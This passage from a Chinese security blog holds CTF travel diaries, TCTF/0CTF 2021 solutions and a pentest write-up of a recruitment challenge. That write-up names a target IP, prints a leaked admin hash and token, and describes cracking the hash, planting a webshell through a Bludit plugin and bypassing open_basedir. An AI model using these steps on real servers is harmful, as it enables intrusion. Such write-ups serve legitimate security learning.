恰饭各种好吃的，广东茶点（没拍多少）、鱼皮、云吞面、双皮奶、烧鸭饭…… 凉拌鱼皮吧，还挺有味道的，真没想到专门做鱼皮也能做得挺大的了。 不行，码着字现在看着肚子饿了。 那就先这样吧啊啊啊。 小结大概就是—— 打比赛 x 划水摸鱼嫖键盘面基旅游 sqrt 其实玩得还是挺开心的喵~ （咕咕咕，终于写完了 当然如果哪里写的有问题，还希望师傅们带带弟弟（ Extensive Reading CTF | 2021 红帽杯 WriteUp 碎碎念 | 2021 强网杯S5 全国网络安全挑战赛线下赛 郑州游记 碎碎念 | X-NUCA 2020 全国高校网安联赛总决赛 深圳游记 （溜了溜了喵~","path":"2021/07/29/Life_2021RedHatFinal_trip/"},{"title":"碎碎念 | 2021 强网杯S5 全国网络安全挑战赛线下赛 郑州游记","text":"本文谢绝转载！ 前言前段时间去河南郑州打了个 强网杯S5 全国网络安全挑战赛线下赛，顺便和师傅们在附近玩了玩，这篇大概算是个郑州的游记吧，写得就比较随意 是流水账 啦。 很难得线上赛挤进了全国前 32，最终以第16名进入了线下赛，能够有机会出来见见 （隔壁） 清华、浙大、上交等高校以及腾讯、长亭等企业的带师傅们。 （咕咕咕……别咕啦，再咕这篇游记就没有啦！ ！！！多 图 预 警！！！ ！！！流 量 预 警！！！ （虽然传上来之前已经尽可能压缩了 酒店先说说住宿吧。 主办方安排的酒店，环境还是挺不错的，这个桌子和小沙发就挺适合多人坐在一起解题的。 （可惜咱么得经费，就只有打线下赛的队员来了线下，人家有的整个战队一起来的…… 酒店的自助晚餐还挺不错，主办方还是挺壕的。 比赛比赛场地在网络安全科技馆，就在酒店旁边。感觉是专门为强网杯这比赛修了一栋楼，作为赛事永久举办地点，顺便做网络安全的科普教育基地之类的。 甚至打着比赛发现有游客来参观，才知道咱是在人家旅游景点里打比赛啊…… 场地的布置还是挺有气势的，所有战队围着中间一个大圆盘，正前方三块大屏幕，中间屏幕下面是挑战区，往前是解说席。 比赛的时间是 7.10 上午9点 - 7.11 下午17点，时长32小时，还是挺顶的。 赛制是 Cold Down（CD）和 Real World（RW）同时进行，其实都是解题赛。 CD 赛制 貌似是今年才出来的，也就是所得分数与 解出的队伍数 及 解题时间 都有关系，得分是随解题队数衰减的基础分+随时间衰减的加成分。其实就引入了个时间因素啦。 RW 题目 算是第一次来玩，题目针对的是真实场景中的环境来出的题。这次一上来就给每个队发了个小米路由器（下图），附带了个U盘，里面有 RW 所有题目的附件。128GB 的 U盘，全是压缩包都要占满了。 比赛开始前，工作人员把印有题目名称的旗子🚩放到了场地中央的台子上，CD 和 RW 题目分别在两边。啊是真正的 夺旗赛，可是只有一血才能拿到，呜呜呜。 比赛 CD 相关的题目主要包括 web 内网渗透、密码学、区块链智能合约、pwn、逆向等。 RW 包括 Windows、MacOS、Chrome、IEsbx（IE浏览器）、ESXisbx、Mi Router（小米路由器Pro）、OA（是个 Web）、VGA(VirtualGuestAttack)（QEMU 的虚拟机逃逸）、EthJump（区块链智能合约），一共八道题。 题目还是挺顶挺头秃的，喵喵主要是看偏 misc 和 web 方向的题，比如 mDMZ 那个内网渗透系列、rua、OA 之类。 可惜喵喵又不咋懂 binary，只能顺便和队友一起日日路由器，配配网络，给队友配配环境，给队友 端茶倒水打打杂 这样子啦（bushi （寻思着是不是啥时候得学学 binary 了 Web 题目还是有点意思的，后面单独写一篇 Writeup 吧，如果不咕的话。 下面这几段是吐槽时间，如果不想看就跳过吧。 说好的有 茶歇区 呢，然而每次去看那边都是空的……唯一有的一次是第二天一大早去的时候，还能勉强摸个可乐、火腿肠。（主办方说是茶歇被志愿者和观众撸走了，喵？？？ 题目环境在内网，场上是通外网的，出口是郑州联通。咱网口虽然协商到了千兆，但外网跑满了也只能跑到 1.几 MiB/s 这样，配个大概 1GiB 的环境，硬是给咱下了十几二十分钟，好不容易整下来了发现 Windows 下又跑不起来，于是又到虚拟机里拉了个 Linux 环境的，又十几二十分钟过去了，这网速配环境真心态崩了……还好最后还是跑出来了。 另外，主办方给的一个环境 Dockerfile 有点问题，刚开始是换源换的阿里源构建不起来，后来手动换了别的源发现 apache 还是 build 不起来，给队友看发现也不行。最后么得办法，寻思着也没必要啊，还不如自己直接起个 PHP + MySQL……赛后和其他队师傅唠嗑，他们也吐槽这个来着，最后也是自己起 PHP 了。 （这环境起不来其实挺影响心态的，由于环境问题耽误了挺多时间导致后面也没做出这题，唉，主要也没及时调整策略，咱自己也背锅 比赛期间的几餐是送餐，然而其实并不好吃…… 比赛现场的摄像机位也贼丰富，还时不时有摄影师过来拍照，比赛还有直播，媒体支持还是挺到位的。 现场的大屏动画其实还挺炫酷的，然而做不出来就是了…… 快看解说席上（穿着 GitHub T恤）的 NanoApe！ 题目做不出来的时候就抬头望望 Nano，整挺好的。 可惜内网渗透半天日不下来，SSRF 半天打不通，路由器找到了漏洞点但半天找不到哪里调用……唉还是太菜了。 再说说 rua 那题 SSRF，他 flag 在 docker 内网另一台机器上，需要绕过外层靶机的 nginx 里用 lua 写的一个 正则匹配。这题最开始的靶机特卡，后来主办方又开了几个新的，尝试了通过靶机直接发包到自己的 VPS，hexdump 看了没发现啥问题，然而打到内网机器一直 POST 不过去。 赛后和其他师傅交流，他部分靶机环境配得有点问题，和他们类似的 payload 然而咱就是打不通，后来想想估计是由于不同靶机的内网环境不一样导致的，也就是说，不同靶机对应的 docker 内网 IP 可能不一样，但咱打的时候默认了是完全一致的环境，于是用了最开始发现的内网靶机 IP 直接打的不同靶机。另外，部分靶机环境很卡，lua http 请求超时的话也是返回 nil，其中也导致了一些误判。这样一想心态更崩了啊！喵呜呜呜。 于是乎比赛的最后一个小时，其他几个打 binary 的队友已经开始讨论要去哪里玩了，喵喵还在那一个人看 web，草，太坏啦！ 不过还好啦，最后拿了个 二等奖，喵！ Asuri NB 就完事了！ 无论如何，非常感谢出题师傅们的精心出题，志愿者、工作人员的辛勤付出哈。 面基 &amp; 游玩 &amp; etc.比赛前一天晚上就去找 NanoApe 面基了，又抱到 Nano 啦！好可爱啊啊啊，喵~ 本来想面 Yoshino-s Y老师的，结果比赛结束半天没找到人，最后只是在酒店电梯见了一面，Y老师就匆匆赶飞机去了。 面了 Y4tacker、FantasqueX 等师傅。后来又去听 Redbud 的大师傅讲了讲路由器怎么日…… Orz 接下来的话其实就是愉快的 旅游时间 啦~ 和队友的午餐，恰了 河南烩面。 面在里面，寻思着应该捞一捞再拍的（？ 约了 隔壁 清华 Redbud 的师傅，一起去 郑州黄河文化公园 逛逛。 这个地质博物馆的英文翻译好奇怪啊…… No moking warm tips 然而那天太阳大得亚批，天气热得不行，大家就在景区里随便转了转就回去了…… 晚上一起 恰了日料。 服务员望着 Nano：“我们没有儿童吧？” （大家笑 以及，当然少不了 神秘的面基仪式，嘿嘿~ 郑州的夜生活还算热闹，也可能因为这里靠近市中心？ 这个楼的外墙有点意思。 一起去了一家 看上去快要倒闭的 KTV，一直唱到深夜。 Nano 唱高音好听！喵喵喵喵喵喵~ （图文有点关系） 都这样了还不算快倒闭么（跑 后一天，吃了个砂锅鸡烩面（？），大概叫这么个名字吧，分量确实挺足挺实在的。 先和大师傅们道别了，u1s1，有点不舍，挺难得有机会出来见面的。 之后去了 河南博物院。 这里文物真滴多，从下到上依次从古到今展览了各个时期各个领域的文物。 馆内足够大，（如果好好参观的话）可以逛上一两个小时，可能还不够。 河南博物院里提供了语音讲解器租借，看上去是个手机类似物，通过摄像头采集图像进行识别，匹配数据库中的文物数据进而提供介绍。然而其实识别效率只能说还行？倒是看到不少游客（特别是小朋友）半天识别不出来然后识别别的去了。（喵喵看不懂，话说有多少小朋友会在意这文物是啥呢，感觉只是好玩罢了吧）。以及，看馆内的标识，讲解器应该也有好几代产品了。 也有不少志愿者做讲解员，参观途中就遇到了对文物结构、寓意、历史等都很了解的老爷爷，业余时间来志愿讲解的阿姨，还碰到了看上去挺年轻但其实已经退休的阿姨，中文系毕业，出于对文物和历史的兴趣来做志愿讲解的，也才来没多久。听听故事也是挺有意思的。 博物院内有不少组队参观的小朋友，可能是啥夏令营、素质拓展之类的吧，也有很多家长带孩子参观。博物院里有文创商店，还看到了文物考古盲盒、复原盲盒、博物馆纪念护照之类的，科普教育顺便加点带货意义可能如此吧。 天气贼热，出了博物院就在周边随意逛了逛。 （背着游戏本加一块砖出来玩累死啦 当然还少不了 吸猫猫 啦！ 顺便看看傍晚和夜晚的对比。 晚上吃的也算是日式的饭吧。（喵喵吃啥老纠结了 出来在想晚上还能去哪逛逛，打开地图顺着地铁找哪里比较顺路也比较近的。 中原福塔，嗯，就你了！ 不愧是 目前世界上最高的全钢结构塔，还是挺有意思的。 到这里就差不多了，收拾收拾回家了。 最后，放点 飞机上的风景 吧。 小结强网杯主办方还是挺热情挺贴心的，强网杯 S5 圆满成功，撒花！🎉 这几天和不少师傅面基了，又抱到 NanoApe 了，可惜郑州这边没啥好玩的地方，只能随意逛逛这样。 总之，这几天玩得倒是挺开心的，喵喵~ 然后回来动不动想睡大觉，打比赛+玩累死了，呼噜呼噜…… 啊，这篇游记咕了快有一周了吧，终于写完了…… 写的比较随意，如果哪里说的有问题，还请各位大师傅多多指教，Orz！ Extensive ReadingCTF | 2021 强网杯线上赛 Web&amp;Misc WriteUp 碎碎念 | X-NUCA 2020 全国高校网安联赛总决赛 深圳游记 （溜了溜了喵~ 喵呜，7.20 河南 “千年一遇” 特大暴雨，哦，极值暴雨也太阔怕了，一小时降水量相当于全年降水量三分之一…… 郑州严重内涝，地铁、火车停运，多地停电停水，通讯中断，听说部分骨干核心机房被淹了，CERNET 郑州核心节点上演了一场惊心动魄的网络保卫战…… 这次特大降雨造成的内涝，竟然将省会城市部分骨干核心机房也淹了，而且主备机房都发生雨水倒灌。在本地主备HLR都受灾的情况下，运营商启用了位于邻近省份省会城市的备份HLR，临时顶替退服的本地HLR，保障业务的实现。 via 郑州洪灾，通信网络的容灾机制，发挥作用了吗？ 另一边，南京禄口机场发现了多例新冠阳性…… 喵呜，河南挺住，南京挺住，希望大家都没事就好了。","path":"2021/07/19/Life_2021QiangwangFinal_trip/"},{"title":"Pentest | 2021 百灵鸟团队纳新玩家活动 Bludit v3.12.0 WriteUp","text":"引言 2021.06 百灵鸟团队纳新玩家活动 2021年6月27日，新的纳新玩家活动开始了，还是渗透测试题。如果您成功拿下目标，请第一时间联系对应的邮箱。关于团队申请方式及后期活动都在附件中有说明。目标地址：119.45.4.159任务获取目标服务器中“Hi RedTeam”文件内容，即可（“Hi RedTeam”是文件名，强调是文件名）。【截止日期2021年7月4日】 上个月底某天刷着说说，正好看到有师傅转发了这个活动。 寻思着那几天摸鱼比较有空，来随便玩了玩，这里也就简单记录一下。 步骤 目标靶机地址：http://119.45.4.159/ （现在应该关了 用的是 Bludit 这个 CMS. （GitHub repo） fscan 一下 # ./fscan -h 119.45.4.159 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.6.2 start infoscan (icmp) Target '119.45.4.159' is alive icmp alive hosts len is: 1 119.45.4.159:888 open 119.45.4.159:21 open 119.45.4.159:22 open 119.45.4.159:80 open 119.45.4.159:8888 open alive ports len is: 5 start vulscan [*] WebTitle:http://119.45.4.159:888 code:403 len:262 title:403 Forbidden [*] WebTitle:http://119.45.4.159:8888 code:302 len:219 title:Redirecting... [*] WebTitle:http://119.45.4.159 code:200 len:27 title:欢迎使用Bludit | BLUDIT [*] WebTitle:http://119.45.4.159:8888/login code:200 len:24 title:安全入口校验失败 [+] InfoScan:http://119.45.4.159:8888/login 宝塔-BT.cn 已完成 5/5 scan end 8888 端口有个 删库 宝塔，不过日不起来。 dirsearch 发现 80 端口主站有备份文件泄露。 下载下来。 \\bl-content\\databases\\users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; { \"admin\": { \"nickname\": \"Admin\", \"firstName\": \"\\u7ba1\\u7406\\u5458\", \"lastName\": \"\", \"role\": \"admin\", \"password\": \"0b6142813f850401af6f2dc79e0e54ca11e8ebde\", \"salt\": \"60d801bb12cea\", \"email\": \"\", \"registered\": \"2021-06-27 12:42:35\", \"tokenRemember\": \"\", \"tokenAuth\": \"2ffb21608fe6d91865de3ea1ff3366a3\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\" } } 到 https://www.somd5.com/ 解密一下 得到密码为 redteam。 登录进入后台。 版本信息 当然，通过 CSS 等也可以知道版本信息为 3.12.0 根据 GitHub 上的 Bludit v3.13.0，发现果然有洞，修了个文件上传的漏洞。 根据 https://github.com/bludit/bludit/issues/1218 好家伙，是尖尖师傅挖的洞！ 然后发现他把 uploadBackup 这个函数都删了…… 这路走不通。 再搜了一下还有不少 XSS 的洞，也没啥用。 看源码，文件上传都有拓展名的过滤，3.13.0 版本新增了 Mime type 校验，也没啥用。 再看插件，发现有个插件 Remote Content 可以下载文件。 This plugin provides an easy way to have the content of your site on Github or similar and in turn is synchronized with your Bludit. 源码路径在 backup\\bl-plugins\\remote-content\\plugin.php 关键源码如下。 public function beforeAll() { // Check Webhook $webhook = $this-&gt;getValue('webhook'); if ($this-&gt;webhook($webhook)) { $this-&gt;cleanUp(); // Download files $this-&gt;downloadFiles(); // Delete the current content $this-&gt;deleteContent(); // Generate the new content $this-&gt;generateContent(); // End request $this-&gt;response(array('status'=&gt;'0')); } } private function downloadFiles() { // Download the zip file Log::set('Plugin Remote Content'.LOG_SEP.'Downloading the zip file.'); $source = $this-&gt;getValue('source'); $destinationPath = $this-&gt;workspace(); $destinationFile = $destinationPath.'content.zip'; TCP::download($source, $destinationFile); // Uncompress the zip file Log::set('Plugin Remote Content'.LOG_SEP.'Uncompress the zip file.'); $zip = new ZipArchive; if ($zip-&gt;open($destinationFile)===true) { $zip-&gt;extractTo($destinationPath); $zip-&gt;close(); } // Delete the zip file unlink($destinationFile); return true; } // Delete the page and uploads directories from bl-content private function deleteContent() { // Clean the page database global $pages; $pages-&gt;db = array(); Filesystem::deleteRecursive(PATH_PAGES); Filesystem::deleteRecursive(PATH_UPLOADS); mkdir(PATH_PAGES, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS_PROFILES, DIR_PERMISSIONS, true); mkdir(PATH_UPLOADS_THUMBNAILS, DIR_PERMISSIONS, true); return true; } private function cleanUp() { $workspace = $this-&gt;workspace(); Filesystem::deleteRecursive($workspace.DS); mkdir($workspace, DIR_PERMISSIONS, true); return true; } private function generateContent() { global $pages; $root = Filesystem::listDirectories($this-&gt;workspace()); $root = $root[0]; // first directory created by the unzip // For each page inside the pages directory // Parse the page and add to the database if (Filesystem::directoryExists($root.DS.'pages')) { $parentList = Filesystem::listDirectories($root.DS.'pages'.DS); foreach ($parentList as $parentDirectory) { $parentKey = basename($parentDirectory); if (Filesystem::fileExists($parentDirectory.DS.'index.md')) { $row = $this-&gt;parsePage($parentDirectory.DS.'index.md'); $row['slug'] = $parentKey; $pages-&gt;add($row); } $childList = Filesystem::listDirectories($parentDirectory.DS); foreach ($childList as $childDirectory) { $childKey = basename($childDirectory); if (Filesystem::fileExists($childDirectory.DS.'index.md')) { $row = $this-&gt;parsePage($childDirectory.DS.'index.md'); $row['slug'] = $childKey; $row['parent'] = $parentKey; $pages-&gt;add($row); } } } Theme::plugins('afterPageCreate'); reindexCategories(); reindexTags(); } return true; } 就利用 backup.zip，随便 echo 个东西。 在自己 VPS 上把这个压缩包放好，起个 web 服务。 Source 就填 VPS 上文件的地址。 访问 http://119.45.4.159/bacw 触发。 而后在 http://119.45.4.159/bl-content/workspaces/remote-content/index.php 就看到这个 233 了。说明有戏。 再写个一句话木马上去。 蚁剑成功连上！ 同理，冰蝎也可。 然而反弹 shell 没有回显啊…… 另外也限制了能访问的目录。 发现有个 .user.ini 里设置了 open_basedir. 参考 php文件包含目录配置open_basedir的使用与性能分析 open_basedir 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。 把这个 .user.ini 重命名，然后就能不受这个限制，访问其他目录啦。 然而 disable_functions 貌似绕不来啊。。 passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv 噢，不用绕了…… 发现所需要的 Hi RedTeam 文件就在 wwwroot 的另一个目录下。（旁站嘛） 完事~ 小结其实难度还好，就这样吧（ 顺便，感谢大师傅出题，师傅们太强啦 Orz！ 官方 Writeup 也出来了： Bludit 3.12.0 【百灵鸟安全团队 2021.06纳新题 Writeup】 原来还有一种通过 API 上传图片的漏洞来日的方法啊。 （溜了溜了喵~","path":"2021/07/18/Pentest_2021bailingniao_Bludit/"},{"title":"CTF | 2021 TCTF/0CTF Quals WriteUp","text":"这是一篇放在草稿箱里已经长草的文章，清理的时候才想起来这篇由于没环境复现，后面一懒就忘记发了…… 噢，喵喵也不记得有没有写完了，就将就发一下吧（摊手 引言 TCTF/0CTF 2021 Quals 比赛时间: 2021-07-03 10:00 ~ 2021-07-05 10:00 https://tctf.qq.com/ https://ctf.0ops.sjtu.cn/ 或 https://tctf.0ops.top/ 前不久有个 TCTF/0CTF 2021 线上预选赛，寻思着有点意思就来打了，题目好难啊。 只不过队里的小师傅们都在准备期末考试，么得办法只有几个老人随便玩了。 这篇就随便水水吧。 Miscwelcome Welcome to 0CTF/TCTF 2021! Join Discord for flag flag{welcome_to_0ctf/tctf_2021_have_fun} GutHib What happens on GutHib, stays on GutHib. repo: awesome-ctf/TCTF2021-Guthib 根据 commit 历史可以看到有敏感信息被移除了。 发现用了 BFG Repo-Cleaner 来清理 commit 历史里留存的敏感信息。 其官方的文档：https://rtyley.github.io/bfg-repo-cleaner/ 使用说明（Usage） 对比可以发现没有执行 gc 垃圾清理操作，理论上本地的 object 里还存有原始的数据。 然而直接 git clone 下来的 object pack 中并没有冗余信息，可能传输过程中进行了精简吧…… 不过利用 GitHub API 记录的 events，由于 API 是读的是 GitHub 的 event 数据库，而不是 git repository，本地最后 push 上来的并没有影响服务器上的。而 GitHub 上的也没进行 gc 清理，这就能够恢复了。 https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events?page=4 首先从 event 里拿到之前错误的 commit hash，然后用 commit hash 再去找对应的提交和文件。 https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/commits/da883505ed6754f328296cac1ddb203593473967 https://github.com/awesome-ctf/TCTF2021-Guthib/blob/da883505ed6754f328296cac1ddb203593473967/Try.2.md flag{ZJaNicLjnDytwqosX8ebwiMdLGcMBL} 挺有意思的 233. See also: 使用 Roberto Tyley 的 BFG Repo-Cleaner 移除 git 库中的二进制文件 在 git 中，所有文件和文件夹的数据都只存储一次，并且每个都会有一个独一无二的 id——git-id。如果大量的 commit 都没有修改某个文件，那么这个文件只会被保存一次。如果这个文件有两个版本，并且需要在两个版本间来回切换，这个文件只会存储两次，每个版本各一次。 BFG 只对 git 库中的每个对象清理一次，然后记住它的 git-id，以后遇到它，不把它计算在内就行了。 BFG Repo-Cleaner - 从 Git 历史中真正删除文件 其实刚开始考虑 BFG 默认认为当前最新的 commit 已经删除了敏感信息，于是其进行的修改只涉及历史 commit，最新 commit 不做更改。后来发现其实当前最新的 commit 也已经删掉敏感信息了…… .git文件夹探秘，理解git运作机制 （然后把 git 底层咋存储的给摸了一遍 233 Survey https://wj.qq.com/s2/8706427/d012/ flag{im_curious_have_u_viewed_source_before_filling_out_the_survey} 噢是这个意思啊。 Singer Sing a song~ special format: flag{[a-z]*} https://attachment.ctf.0ops.sjtu.cn/singer_0cc09b073ebbbffcc5720d081f42feea 给的文件是这个。 A6-D#6 G#6 G6 G6 G#6 A6-D#6 C6-G5 F#5 F#5 C6-G5 A6-F#6,D#6 A6,F#6,D#6 A6,F#6-D#6 A6,D#6 A6-D#6 A6,D#6 F#7-C7 E7-D7 F7,C#7 F#7,C7 E6,A#5 E6-A#5 E6,A#5 A6-D#6 A6-G6 F#6-E6 A6-D#6 C#7-G6 C#7,G6 C#7,A#6,G6 C#7,A#6-G6 寻思着应该是音符。 想了半天没搞懂啥意思。。 后来考虑是不是音游的谱子啊，查了查发现也不是吧。 但后来又看到某音游—— 会不会是这个按键连成的啥字符啊。 然而比赛的时候就没画出来，草！ 赛后发现有个 Online Sequencer，是一个在线制作音乐的工具，支持模拟多种乐器，可以导出 ogg/mp3/midi，还能分享 sequence。 然后按照文件里的分块，每个分块是一个字母，- 就是两个键之间连起来，, 就是多个键同时按下。 于是就可以得到这样的图形。 于是 flag 就是 flag{musiking} （脑洞真的大…… TCTF Share It is a misc quest absolutely. https://bt.hzh.moe/ Flag format: TCTF{.*} 是个 hugo 建的博客，两篇博文。 上面那篇 Wonder Egg Priority OP 两个磁力链接分别是 https://bt.hzh.moe/files/Wonder-Egg-Priority-Safe.torrent magnet:?xt=urn:btih:CIY7BQVJYC7GXF3AF4OA6SLZTZZAQDBS&amp;dn=%E3%83%AF%E3%83%B3%E3%83%80%E3%83%BC%E3%82%A8%E3%83%83%E3%82%B0%E3%83%BB%E3%83%97%E3%83%A9%E3%82%A4%E3%82%AA%E3%83%AA%E3%83%86%E3%82%A3%20(Wonder%20Egg%20Priority)%20OP.7z 看了下有个 txt 文件，链接就是个动漫。https://www.youtube.com/watch?v=5yN9w_yzH2w 下面那篇 Tencent CTF https://bt.hzh.moe/files/TCTF.torrent magnet:?xt=urn:btih:AQEQB7YBOGIMOQARSRXSHGULZUI25EY3&amp;dn=Secret%20of%20TCTF%202021.7z 很明显就是这个了，然而上面那个下载下来是全空的，下面那个下载不下来。 参考磁力链接的结构，btih 是指 BitTorrent Info Hash。 参考大师傅的 wp，AQEQB7YBOGIMOQARSRXSHGULZUI25EY3 即被 Base32 编码过的 BTIH 散列结果，把它转换为 hex 编码的。 %04%09%00%ff%01%71%90%c7%40%11%94%6f%23%9a%8b%cd%11%ae%93%1b 再参考第一个 torrent 文件，可以得到 httpseeds 参考 对于bittorrent协议的深入研究与探讨 HTTP Seeding HTTP-BASED SEEDING SPECIFICATION PROTOCOL: The client calls the URL given, in the following format: &lt;url&gt;?info_hash=[hash]&amp;piece=[piece]{&amp;ranges=[start]-[end]{,[start]-[end]}...} Examples: http://www.whatever.com/seed.php?info_hash=%9C%D9i%8A%F5Uu%1A%91%86%AE%06lW%EA%21W%23\u00025%E0&amp;piece=3 http://www.whatever.com/seed.php?info_hash=%9C%D9i%8A%F5Uu%1A%91%86%AE%06lW%EA%21W%23\u00025%E0&amp;piece=8&amp;ranges=49152-131071,180224-262143 于是可以构造出地址为 https://bt.hzh.moe/seeding?info_hash=%04%09%00%FF%01%71%90%C7%40%11%94%6F%23%9A%8B%CD%11%AE%93%1B&amp;piece=0 直接浏览器里打开不行，需要改 UA 为 BT 客户端…… 写个脚本分 piece 下载一下。超过范围会返回 400，判断一下退出。 import requests fp = open('1.7z', 'wb') header = {'user-agent': 'uTorrent'} i = 0 while True: print(i) url = f'https://bt.hzh.moe/seeding?info_hash=%04%09%00%FF%01%71%90%C7%40%11%94%6F%23%9A%8B%CD%11%AE%93%1B&amp;piece={i}' r = requests.get(url, headers=header) fp.write(r.content) if r.status_code == 400: break i += 1 print('Download OK!') 最后 piece 是 0-46，下载下来解压得到一个 TCTF.vhdx。 挂载得到一个 hint.bat 最后提示了文件名进行了修改。 于是可以去查看 NTFS 硬盘历史记录。想起上次强网杯那道 EzTime 题目了…… 这里试了试用 AXIOM 分析硬盘 $LogFile，发现巨大多修改文件名的记录。 找了半天确实能找到 flag 了…… TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ} 或者也可以导出硬盘日志，然后写个脚本整合一下。 首先用 DiskGenius 把显示元文件（Metafile）勾上，然后才能看到 $LogFile 这些信息，然后导出来。 用 LogFileParser 来解析硬盘日志，可以得到 csv 数据文件。 根据这个 LogFile_lfUsnJrnl.csv 可以得知文件的修改历史。 写个脚本，找一下更改为新名字且文件名长度为1的文件名，另外再根据 MFTReference 分别统计并输出。 with open('LogFile_lfUsnJrnl.csv', 'r', encoding='utf-8') as f: s = f.read() l = s.split('\\n') # 404.html|304|2021-07-02 20:12:48.5212936|FILE_CREATE+DATA_EXTEND+CLOSE|40|1|39|1|archive|2|0|0x00000000|0 info = {} data = '' for x in l: d = x.split('|') # if d[3] == 'RENAME_NEW_NAME+CLOSE': if 'RENAME_NEW_NAME+CLOSE' in d: f = d[0] print(f) filename = f.split('.')[0] if len(filename) == 1: # extension = f.split('.')[1] MFTReference = d[4] if MFTReference not in info: info[MFTReference] = '' info[MFTReference] += filename print(info) for i in sorted(info, key=lambda x: x[0]): print(i, info[i]) # 43 wpa4b1AQVPOibxTBwz7Qn2xXcFy{Jbnca7pDyIMAR7i8Sseg5sRpPIBIW68opBiNB # 49 t}IuwI9Chdl0O1P8hYzwku8MTfKub4li49wzetpEbWHIHfhl3WGc7gh0c0WzpMClH # 46 iPt86USAMpWJz5fDI47Vzu6BdlqxCxX0n6viKvNoZ7AzEAEHOpny0ZfV6tuT4QZm # 47 j}vUG4Hr}DVGRFKZcY6op5BGLT}LqLrudLZqHOrh9Hcx8LVpOIeobvkrEyaTPzpV # 44 phYaPUyusxk5}0PJQ19HsH3jHIonhFQVBxyzvtTUL7}W61xv7t3tUBhWOKiVio}tM # 40 a3bGkqTNUhMOUAp2DMsAlA3}5jTxtPamvcuRJugpnD{pr}Wp4FDdr2HqUqYVyQ26 # 50 5TW57LSdRtbqa404yFJd2ujXJ{lPRPUwtfGtywtJBP5eGUF{mvkZE7}wSg5deoHL}i # 59 NCJUO0B}Olw1b6CgZTFsncv2}pYfTJ323WJHeE03g2IZaCcyhgLn3WS2BGKr7zglR6 # 54 m0ngAg1g16KUDp8Zl0K7nbwLrLhMoasREHClz2aWJY6edmGlHrOdqXFgeKUQBEko # 53 Q2DnB4b{K{2FxleNfZ5ZDaA6tl{GIUbMFN3kLOs1p5kJgu9TzYBxGDTmYa}iet2}P # 51 Dyxy3OTAJdsovteo3{Z1MirxF9BmJ1ZAfov7tGKi1CpiDmNF7o3IJEvhOmV9RjLDP # 57 WOW0Is1That2Flag3TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ}4God5Job # 64 Nh1W7gq{Ea7XLGNCnFpKlo3j0sXxUklmrqFWtWt04Dc80XDg90JqFgZzLiWeoJbzx # 65 ngnv2GZ6UD9aJnfnuFBIx1Mo084lND4}Oom7x{rbT7mTHl6OtNM9CrOjZGD4Lce # 62 L61ulkKDvC7Kh}FYXwslD0jp{auQstMN5S2hIXmSMkdZtYTVmltslyLPCTOdF1ysG # 61 yrOyO9XJK13Pbnr2Msym{NzdA5mbyhKL5cgbO2moJC90f92B7Q0lGIucN2XAXj}MQ 最后也可以得到 flag。 WOW0Is1That2Flag3TCTF{B7UmV4x8JRHNKBCWxyevXt97tnQJtHjrZ}4God5Job Cryptocheckin Welcome to 0CTF/TCTF 2021! 111.186.59.11:16256 Nothing fancy, just do the math. 虽然是大数求解，但直接拿 gmpy2 来算就完事了。 from gmpy2 import mpz from pwn import * import re context.log_level = 'debug' context.timeout = 10 sh = remote('111.186.59.11', 16256) sh.recvuntil(\"Show me your computation:\\n\") x = sh.recvuntil(\" = ?\").decode() print('====&gt; x:', x) d = re.findall(r'(\\d+)\\^\\((\\d+)\\^(\\d+)\\) mod (\\d+) = \\?', x)[0] print('=====&gt; info:', d) a, b, c, p = [int(a) for a in d] result = pow(mpz(a), pow(mpz(b), mpz(c)), mpz(p)) print('=========&gt; result:', result) sh.sendlineafter(\"Your answer: \", str(result)) sh.recvall() # Here is your flag: flag{h0w_m4ny_squar3s_can_u_d0_in_10_sec0nds?} zer0lfsr- Much easier than zer0lfsr! nc 111.186.59.28 31337 not download NOTICE: the download link is updated. use the link below download 源码： #!/usr/bin/env python3 import random import signal import socketserver import string from hashlib import sha256 from os import urandom from secret import flag def _prod(L): p = 1 for x in L: p *= x return p def _sum(L): s = 0 for x in L: s ^= x return s def n2l(x, l): return list(map(int, '{{0:0{}b}}'.format(l).format(x))) class Generator1: def __init__(self, key: list): assert len(key) == 64 self.NFSR = key[: 48] self.LFSR = key[48: ] self.TAP = [0, 1, 12, 15] self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]] self.h_IN = [2, 4, 7, 15, 27] self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]] def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def h(self): x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def f(self): return _sum([self.NFSR[0], self.h()]) def clock(self): o = self.f() self.NFSR = self.NFSR[1: ] + [self.LFSR[0] ^ self.g()] self.LFSR = 